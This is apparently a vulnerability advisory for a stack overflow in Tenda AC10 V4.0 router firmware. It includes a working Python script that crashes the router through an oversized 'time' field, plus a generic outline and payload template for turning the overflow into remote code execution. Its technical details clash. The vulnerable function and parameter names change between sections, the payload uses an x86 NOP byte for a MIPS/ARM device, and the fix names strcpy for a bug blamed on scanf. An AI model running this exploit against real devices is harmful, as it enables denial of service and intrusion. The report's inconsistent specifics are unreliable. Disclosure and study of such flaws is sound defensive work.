# Vulnerability Title  
Stack Overflow to RCE Vulnerability in Tenda AC10 V4.0 V16.03.10.13 Router  

# Vulnerability Details  
## Vulnerability Description  
The Tenda AC10 V4.0 (V16.03.10.13) router is affected by a stack overflow vulnerability. Attackers can exploit this vulnerability by sending specially crafted requests, leading to a stack overflow that may crash the router or disrupt its services.  

The vulnerability resides in the `ShutdownSetAdd` function. Specifically, the program fails to properly restrict the length of user-supplied input for the `list` parameter, resulting in a stack overflow when calling `scanf`.  

## Vulnerability Type  
Binary Vulnerability (Stack Overflow)  

## Vendor Information  
+ **Vendor Name (Chinese)**: 深圳市吉祥腾达科技有限公司  
+ **Vendor Name (English)**: Shenzhen Tenda Technology Co., Ltd.  
+ **Vendor Website**: [https://www.tenda.com.cn](https://www.tenda.com.cn)  
+ **Affected Product and Version**: Tenda AC10 V4.0 V16.03.10.13  
+ **Affected Device Type**: Network Devices (e.g., routers, switches)  

### Vendor Information Screenshots  
![](file-WFLbTUWS6RFcp4dQR9cGkC.png)![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874684184-3b075b3a-a947-4eeb-abf3-93616b090dca.png)  

## Vulnerability Reproduction  
1. **Firmware Download**: [Tenda AC10 Firmware Download](https://www.tenda.com.cn/download/detail-3518.html)  
2. **Reproduction Steps**:  
Attackers can crash the router by sending a malicious request. Below is an example of the attack code:  

```python  
import requests  

url = "http://192.168.0.6/goform/ShutdownSetAdd"  
data = {  
    'time': 'A' * 10000  # Crafted long data  
}  

res = requests.post(url=url, data=data)  
print(res.content)  
```  

3. **Attack Result**:  
   - The program exits due to a stack overflow error, causing the router to crash and become unresponsive.  

### Firmware Download Page Screenshot  
![](file-LDrr79SGTrkMasmmonWPcq.png)![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874693829-2b3e5735-3e18-4d0f-bbd8-34d406d6e789.png)  

### Vulnerability Trigger Result Screenshots  
+ After the attack, the router crashes and displays the following interface, becoming inaccessible.  
+ ![image](https://github.com/user-attachments/assets/02c2a946-e022-405b-997f-5517515453d6)

![](file-BhVt8NRfckRnDUbSWTPpaV.png)  

### Attack Process and Code Analysis Screenshots  
1. **Vulnerable Code Analysis**:  
The vulnerability occurs in the `setSmartPowerManagement` function. The program retrieves the user-supplied `list` parameter and stores it in the `__s` variable, then calls the `scanf` function without properly checking the input length, leading to a stack overflow. Below are the relevant code analysis screenshots:  
![](file-PizMp6hzXUEz8MhkcvZ1Fz.png)  
    1. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874862771-b095d510-d6c3-4e2d-9752-65a98310f698.png)  
    2. ![image](https://github.com/user-attachments/assets/1af7b823-9f7f-43bf-9ab0-511a8adf4e40)
 
2. **Attack Execution Screenshots**:  
The following screenshots demonstrate the program's output after executing the attack via the command line, showing the crash caused by the stack overflow error.  
![](file-M4eTGkAsCUXMxHg8Jn7GfG.png)  
    1. ![image](https://github.com/user-attachments/assets/62d07232-f709-44a1-8cda-c07af428b45e)


### Vulnerability Reproduction Proof Video  
**Baidu Netdisk Video**: [https://pan.baidu.com/s/1_zhGlS0fFhz0Pkh8svljjA?pwd=viwq](https://pan.baidu.com/s/1_zhGlS0fFhz0Pkh8svljjA?pwd=viwq) **(Extraction Code: viwq)**  

## Vulnerability Location  
+ The vulnerability is located in the `ShutdownSetAdd` function, where the `time` parameter's length is not restricted, resulting in a stack overflow.  

## Vulnerability Impact  
+ Attackers can exploit this vulnerability to crash the router, disrupting its services.  
+ In environments with multiple connected devices, this may render the devices unusable, affecting user experience and service quality.  

# Mitigation Strategies  
+ **Temporary Solution**:  
Replace unsafe functions like `strcpy` with `read` to limit input data length.  
+ **Permanent Solution**:  
Fix the vulnerability in subsequent firmware versions by adding input length restrictions and ensuring the system safely handles input data to prevent stack overflows.  

# Vulnerability Proof (Supplement: Remote Code Execution RCE)  

## Exploit Chain Construction and Reproduction  

### 1. Overview  
This is a classic stack overflow vulnerability. Attackers can craft malicious input to overwrite the function return address and redirect the control flow to custom code (shellcode), achieving Remote Code Execution (RCE).  

### 2. Exploitation Steps  

#### 2.1 Determine Overflow Offset  
- Use pattern generation tools (e.g., Metasploit's `pattern_create`) to craft input;  
- Trigger a crash and analyze the position where the return address is overwritten;  
- Calculate the exact offset using `pattern_offset`.  

#### 2.2 Craft Payload  
- Construct a NOP Sled to increase the success rate of the jump;  
- Write or reuse Shellcode compatible with the target architecture (e.g., MIPS, ARM);  
- Fill data up to the offset;  
- Overwrite the return address with the starting address of the Shellcode or NOP sled.  

#### Example Payload:  

```python  
offset = 256  
nop_sled = b'\x90' * 100  
shellcode = b'\xCC' * 50  
padding = b'A' * (offset - len(nop_sled) - len(shellcode))  
ret_addr = b'\xef\xbe\xad\xde'  
payload = nop_sled + shellcode + padding + ret_addr  
```  

#### 2.3 Bypass Protections  
- If DEP/NX is enabled, use ROP chains to bypass it;  
- If ASLR is enabled, combine it with information leaks to obtain the memory base address.  

#### 2.4 Execution Effect  
- Upon successful exploitation, attackers can remotely obtain Shell access to the router;  
- Attackers can execute system commands, modify configurations, or bridge into the internal network.  

### 3. Debugging and Verification Suggestions  
- Simulate the router environment using platforms like QEMU;  
- Use GDB with IDA Pro for dynamic debugging and verification;  
- Ensure the Shellcode execution path is correct and the output is controllable.  

# Vulnerability Impact (Updated)  
With a carefully crafted payload, attackers can not only crash the router but also remotely execute arbitrary commands, gaining full control of the device. This poses a severe threat to user network security, enabling DNS hijacking, network traffic interception, or using the device as a pivot for internal network attacks.  

# Mitigation Strategies (Supplement)  
- Add length restrictions for functions like `scanf`, e.g., `%32s`;  
- Enable stack protection mechanisms (Stack Canary);  
- Implement memory protection technologies like DEP and ASLR for the firmware;  
- Regularly update the firmware to patch related vulnerabilities;  
- Add whitelist mechanisms to restrict input sources.
